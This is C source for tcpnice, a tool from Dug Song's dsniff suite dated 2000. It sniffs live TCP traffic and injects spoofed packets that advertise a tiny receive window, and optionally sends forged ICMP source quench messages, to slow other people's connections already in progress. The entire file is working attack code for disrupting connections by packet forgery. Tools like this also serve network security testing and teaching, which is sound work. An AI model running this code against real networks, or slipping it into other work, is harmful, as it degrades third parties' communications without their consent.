/*
  tcpnice.c

  Slow down TCP connections already in progress.

  this program is a gross hack. feh.

  Copyright (c) 2000 Dug Song <dugsong@monkey.org>
  
  $Id: tcpnice.c,v 1.15 2000/11/30 00:39:05 dugsong Exp $
*/

#include "config.h"

#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include "pcaputil.h"
#include "version.h"

#define MIN_NICE	1
#define MAX_NICE	20
#define DEFAULT_NICE	16

/* Globals. */
int	Opt_nice = DEFAULT_NICE;
int	Opt_icmp = 0;
int	pcap_off;

void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: tcpnice [-i interface] [-I] [-n increment] "
		"expression\n");
	exit(1);
}

void
tcp_nice_loop(pcap_t *pd, int sock)
{
	struct pcap_pkthdr pkthdr;
	struct libnet_ip_hdr *ip;
	struct libnet_tcp_hdr *tcp;
	struct libnet_icmp_hdr *icmp;
	u_char *pkt, buf[IP_H + ICMP_ECHO_H + 128];
	int len, nice;
	
	libnet_seed_prand();
	
	nice = 160 / Opt_nice;
	
	for (;;) {
		if ((pkt = (char *)pcap_next(pd, &pkthdr)) != NULL) {
			ip = (struct libnet_ip_hdr *)(pkt + pcap_off);
			if (ip->ip_p != IPPROTO_TCP) continue;
			
			tcp = (struct libnet_tcp_hdr *)
				((u_char *)ip + (ip->ip_hl * 4));
			if (tcp->th_flags & (TH_SYN|TH_FIN|TH_RST) ||
			    ntohs(tcp->th_win) == nice)
				continue;
			
			if (Opt_icmp) {
				/* Send ICMP source quench. */
				len = (ip->ip_hl * 4) + 8;
				libnet_build_ip(ICMP_ECHO_H + len, 0,
						libnet_get_prand(PRu16),
						0, 64, IPPROTO_ICMP,
						ip->ip_dst.s_addr,
						ip->ip_src.s_addr,
						NULL, 0, buf);
				
				icmp = (struct libnet_icmp_hdr *)(buf + IP_H);
				icmp->icmp_type = 4;
				icmp->icmp_code = 0;
				memcpy((u_char *)icmp + ICMP_ECHO_H,
				       (u_char *)ip, len);
				
				libnet_do_checksum(buf, IPPROTO_ICMP,
						   ICMP_ECHO_H + len);

				len += (IP_H + ICMP_ECHO_H);

				if (libnet_write_ip(sock, buf, len) != len)
					warn("write");

				fprintf(stderr, "%s > %s: icmp: source quench\n",
				     libnet_host_lookup(ip->ip_dst.s_addr, 0),
				     libnet_host_lookup(ip->ip_src.s_addr, 0));
			}
			/* Send tiny window advertisement. */
			ip->ip_hl = 5;
			ip->ip_len = htons(IP_H + TCP_H);
			ip->ip_id = libnet_get_prand(PRu16);
			memcpy(buf, (u_char *)ip, IP_H);
			
			tcp->th_off = 5;
			tcp->th_win = htons(nice);
			memcpy(buf + IP_H, (u_char *)tcp, TCP_H);
			
			libnet_do_checksum(buf, IPPROTO_TCP, TCP_H);

			len = IP_H + TCP_H;

			if (libnet_write_ip(sock, buf, len) != len)
				warn("write");

			fprintf(stderr, "%s:%d > %s:%d: . ack %u win %d\n",
				libnet_host_lookup(ip->ip_src.s_addr, 0),
				ntohs(tcp->th_sport),
				libnet_host_lookup(ip->ip_dst.s_addr, 0),
				ntohs(tcp->th_dport),
				ntohl(tcp->th_ack), nice);
		}
	}
}

int
main(int argc, char *argv[])
{
	int c, sock;
	char *intf, *filter, ebuf[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	
	intf = NULL;
	
	while ((c = getopt(argc, argv, "i:n:Ih?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 'n':
			Opt_nice = atoi(optarg);
			if (Opt_nice < MIN_NICE || Opt_nice > MAX_NICE)
				usage();
			break;
		case 'I':
			Opt_icmp = 1;
			break;
		default:
			usage();
			break;
		}
	}
	if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
		errx(1, "%s", ebuf);
	
	argc -= optind;
	argv += optind;
	
	if (argc == 0)
		usage();

	filter = copy_argv(argv);
	
	if ((pd = pcap_init(intf, filter, 128)) == NULL)
		errx(1, "couldn't initialize sniffing");

	if ((pcap_off = pcap_dloff(pd)) < 0)
		errx(1, "couldn't determine link layer offset");
	
	if ((sock = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
		errx(1, "couldn't initialize sending");
	
	warnx("listening on %s [%s]", intf, filter);
	
	tcp_nice_loop(pd, sock);
	
	/* NOTREACHED */
	
	exit(0);
}
